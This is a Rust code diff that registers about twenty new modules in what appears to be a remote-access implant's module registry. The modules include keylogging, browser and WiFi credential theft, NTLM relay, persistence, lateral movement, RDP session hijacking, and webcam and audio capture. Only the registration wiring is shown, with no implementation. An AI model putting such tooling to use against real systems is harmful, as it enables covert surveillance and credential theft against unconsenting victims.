@@ -132,6 +132,101 @@ impl ModuleRegistry {
         factories.insert("portfwd".to_string(), || {
             Box::new(mod_socks::PortForwardModule::new())
         });
+
+        // Environment module
+        factories.insert("env".to_string(), || {
+            Box::new(mod_env::EnvModule::new())
+        });
+
+        // Keylogger module
+        factories.insert("keylog".to_string(), || {
+            Box::new(mod_keylog::KeylogModule::new())
+        });
+
+        // Clipboard module
+        factories.insert("clipboard".to_string(), || {
+            Box::new(mod_clipboard::ClipboardModule::new())
+        });
+
+        // Registry module
+        factories.insert("reg".to_string(), || {
+            Box::new(mod_reg::RegModule::new())
+        });
+
+        // Service module
+        factories.insert("svc".to_string(), || {
+            Box::new(mod_svc::SvcModule::new())
+        });
+
+        // Persistence module
+        factories.insert("persist".to_string(), || {
+            Box::new(mod_persist::PersistModule::new())
+        });
+
+        // Network scan module
+        factories.insert("scan".to_string(), || {
+            Box::new(mod_scan::ScanModule::new())
+        });
+
+        // Lateral movement module
+        factories.insert("lateral".to_string(), || {
+            Box::new(mod_lateral::LateralModule::new())
+        });
+
+        // Credential harvesting module
+        factories.insert("creds".to_string(), || {
+            Box::new(mod_creds::CredentialModule::new())
+        });
+
+        // WiFi credential harvesting module
+        factories.insert("wifi".to_string(), || {
+            Box::new(mod_creds::WifiModule::new())
+        });
+
+        // NTLM relay module
+        factories.insert("ntlm_relay".to_string(), || {
+            Box::new(mod_creds::NtlmRelayModule::new())
+        });
+
+        // Browser credential theft module
+        factories.insert("browser".to_string(), || {
+            Box::new(mod_browser::BrowserModule::new())
+        });
+
+        // Audio capture module
+        factories.insert("audio".to_string(), || {
+            Box::new(mod_audio::AudioModule::new())
+        });
+
+        // Webcam capture module
+        factories.insert("webcam".to_string(), || {
+            Box::new(mod_webcam::WebcamModule::new())
+        });
+
+        // USB device enumeration module
+        factories.insert("usb".to_string(), || {
+            Box::new(mod_usb::UsbModule::new())
+        });
+
+        // USB monitor alias (CLI dispatches "usb_monitor", module id is "usb")
+        factories.insert("usb_monitor".to_string(), || {
+            Box::new(mod_usb::UsbModule::new())
+        });
+
+        // RDP session hijacking module
+        factories.insert("rdp".to_string(), || {
+            Box::new(mod_rdp::RdpModule::new())
+        });
+
+        // Process enumeration module
+        factories.insert("proc".to_string(), || {
+            Box::new(mod_proc::ProcModule::new())
+        });
+
+        // Active Directory enumeration module
+        factories.insert("ad".to_string(), || {
+            Box::new(mod_ad::AdModule::new())
+        });
     }
 
     /// Get a module by task type
